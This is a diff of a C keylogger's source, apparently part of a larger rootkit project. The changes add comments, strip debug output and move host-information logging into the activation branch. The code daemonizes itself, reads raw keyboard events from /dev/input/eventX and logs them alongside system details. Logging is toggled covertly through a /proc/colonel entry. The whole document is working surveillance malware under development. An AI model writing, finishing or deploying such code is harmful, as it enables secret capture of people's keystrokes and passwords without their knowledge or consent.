@@ -1,4 +1,4 @@
-// REMOVE PRINTF WHEN DONE --- DYNAMICALLY FIND EVENT!!!!
+// DYNAMICALLY FIND EVENT!!!!
 // Maybe use structs input_handle, input_dev, input_handler, or input_dev to determine dev/input/eventX
 #include <sys/types.h>
 #include <sys/stat.h>
@@ -15,17 +15,18 @@
 
 
 int main(void) {
-	FILE *fp = NULL;
-	FILE *evlog;
-	int ftty;
-	int fd;
-	int dir;
-	struct utsname unameData;
-	uname(&unameData);
-	char listening = 0;
-	char cmd[1024];
-	char kl[13] = "keylogger: 1";
-	char *toggle;
+	FILE *fp = NULL;										/* error log */
+	FILE *evlog;											/* device input log */
+	int ftty;												/* will read from /proc/colonel */
+	int fd;													/* will read from device event file */
+	int dir;												/* log directory */
+	struct utsname unameData;								/* struct provides system information */
+	uname(&unameData);										/* provides system information */
+	char listening = 0;										/* toggles keylogger on/off */
+	char cmd[1024];											/* stores commands */
+	char kl[13] = "keylogger: 1";							/* defines what keylogger is listening for 
+															 * on /proc/colonel */
+	char *toggle;											/* listens for keylogger cmd */
 	struct input_event ev;									/* using input_event so we know 
 															 * what we're reading from the 
 															 * event file */
@@ -37,9 +38,7 @@ int main(void) {
 		printf("ERROR: fork failure\n");
 		exit(1);
 	}
-	if (process_id > 0) {
-		// REMOVE printf WHEN DONE
-		printf("process_id of child process %d\n", process_id);
+	if (process_id > 0) {									/* exits the parent process */
 		exit(0);
 	}
 
@@ -90,13 +89,6 @@ int main(void) {
 		return 1;
 	}
 
-	fprintf(evlog, "\n\n%s", ctime(&curtime));				/* timestamp */
-	fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 			/* system data */
-			unameData.nodename, unameData.version,
-			unameData.sysname, unameData.release, 
-			unameData.machine);
-	fflush(evlog);
-
 	while(1) {				
 		fflush(fp);
 		read(fd, &ev, sizeof(struct input_event));			/* read from /dev/input/eventX */
@@ -106,6 +98,12 @@ int main(void) {
 
 		if ((0 == listening) && (toggle != NULL)) {
 			listening = !listening;
+			fprintf(evlog, "\n\n%s", ctime(&curtime));				/* timestamp */
+			fprintf(evlog, "%s\n%s\n%s | %s | %s\n\n-", 			/* system data */
+					unameData.nodename, unameData.version,
+					unameData.sysname, unameData.release, 
+					unameData.machine);
+			fflush(evlog);
 			fprintf(fp, "Begin listening -- %s", ctime(&curtime));
 			close(ftty);
 			continue;
@@ -120,6 +118,8 @@ int main(void) {
 			if (NULL == toggle) {
 				listening = !listening;
 				fprintf(fp, "End listening -- %s", ctime(&curtime));
+				fprintf(evlog, "\nEnd listening | %s", ctime(&curtime));
+				fflush(evlog);
 				close(ftty);
 				continue;
 			}
